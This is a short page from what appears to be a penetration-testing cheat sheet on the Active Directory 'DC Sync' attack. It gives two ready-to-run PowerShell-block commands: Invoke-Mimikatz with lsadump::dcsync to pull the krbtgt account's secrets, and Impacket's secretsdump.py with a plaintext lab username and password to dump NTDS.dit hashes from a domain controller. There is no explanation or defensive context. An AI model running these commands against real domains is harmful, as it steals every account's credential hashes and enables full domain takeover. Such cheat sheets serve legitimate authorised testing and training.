---
title: "DC Sync"
description: "DC Sync attack."
lead: "How to perform DC Sync, both locally and remotely."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "lateral_movement"
weight: 30
toc: true
---

## Locally

```powershell
# DCSync locally with mimikatz for specific user
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## Remotely

```powershell
# Get NTDS.dit via Impacket secretsdump remotely
secretsdump.py -dc-ip 10.10.149.145 spookysec.local/backup:backup2517860@10.10.149.145
```
